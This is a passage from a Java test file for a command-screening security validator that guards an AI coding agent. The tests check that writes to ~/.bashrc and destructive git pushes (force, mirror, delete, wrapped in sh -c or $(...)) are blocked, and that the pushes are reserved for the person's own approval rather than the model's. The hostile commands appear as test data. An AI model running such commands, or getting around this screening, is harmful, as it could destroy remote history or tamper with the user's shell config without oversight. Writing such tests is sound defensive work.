                    validator.commandReferencesCredentialFile("cat ~/projects/app/config.json"));
        }
    }

    /**
     * The shell expands a leading {@code ~} before it opens the file, so a redirect to
     * {@code ~/.bashrc} writes to the home directory. Read as a relative path it named a folder
     * called {@code ~} inside the project, and the write was allowed.
     */
    @Test
    public void aRedirectToTheHomeDirectoryIsReadAsTheShellReadsIt() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            validator = new SecurityValidator();

            for (String line : new String[] {"echo x >> ~/.bashrc", "echo x > ~", "echo x > ~root/.bashrc"}) {
                SecurityValidator.CommandScreening screening = validator.screenCommand(line);

                assertFalse(line, screening.allowed());
            }
            assertTrue(validator.screenCommand("echo x > notes/out.txt").allowed());
        }
    }

    /**
     * A push that can discard commits on the remote is for the person alone to allow. The model
     * answers the approval question under {@code auto}, so a verdict it could settle would let a
     * model force a push on its own word.
     */
    @Test
    public void aPushThatCanDiscardCommitsOnTheRemoteIsForThePersonAlone() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            validator = new SecurityValidator();

            for (String line : new String[] {
                    "git push --force origin main", "git push -f", "git push -uf origin main",
                    "git push --force-with-lease", "git push origin +main", "git push origin :old",
                    "git push --mirror", "git push --delete origin old", "git push -d origin old",
                    "git push --prune origin", "git -C repo push --force", "git -c a.b=c push -f",
                    "env X=1 git push --force", "sh -c \"git push --force\"", "echo $(git push -f)",
                    "git status && git push --force", "git push origin $REFS"}) {
                SecurityValidator.CommandScreening screening = validator.screenCommand(line);

                assertFalse(line, screening.allowed());
                assertTrue(line, screening.personOnly());
            }
            for (String line : new String[] {"git push", "git push -u origin main", "git status",
                                             "git commit -m force", "git log --force"}) {
                assertTrue(line, validator.screenCommand(line).allowed());
            }
            SecurityValidator.CommandScreening both = validator.screenCommand("$TOOL; git push -f");
            assertTrue("the person's question is not handed to whoever settles the other doubt",
                       both.personOnly());
        }
    }
}
